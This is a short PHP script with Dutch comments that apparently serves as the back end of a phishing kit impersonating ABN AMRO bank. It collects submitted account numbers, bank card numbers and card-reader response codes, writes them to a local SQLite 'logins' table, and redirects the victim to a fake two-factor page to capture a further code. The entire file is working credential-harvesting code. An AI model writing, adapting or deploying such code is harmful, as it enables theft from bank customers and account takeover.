<?php
session_start();
// Open of maak de SQLite-database aan in de huidige directory
$db = new PDO('sqlite:' . __DIR__ . '/data.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Maak de tabel aan met een extra kolom voor respons2
$db->exec("CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rekeningnummer TEXT,
    pasnummer TEXT,
    respons TEXT,
    respons2 TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// Verkrijg de gegevens van het formulier en voeg de prefix toe aan het rekeningnummer
$rekeningnummer_input = $_POST['rekeningnummer'] ?? '';
$rekeningnummer = "NL ** ABNA 0" . $rekeningnummer_input;
$pasnummer = $_POST['pasnummer'] ?? '';
$respons   = $_POST['response'] ?? '';

// Voeg de gegevens toe aan de database
$stmt = $db->prepare("INSERT INTO logins (rekeningnummer, pasnummer, respons) VALUES (?, ?, ?)");
$stmt->execute([$rekeningnummer, $pasnummer, $respons]);

// Sla de ID van het ingevoegde record op in de sessie voor de 2FA-update
$_SESSION['login_id'] = $db->lastInsertId();

// Redirect naar de 2FA-pagina
header('Location: 2fa-abnamro.html');
exit;
?>
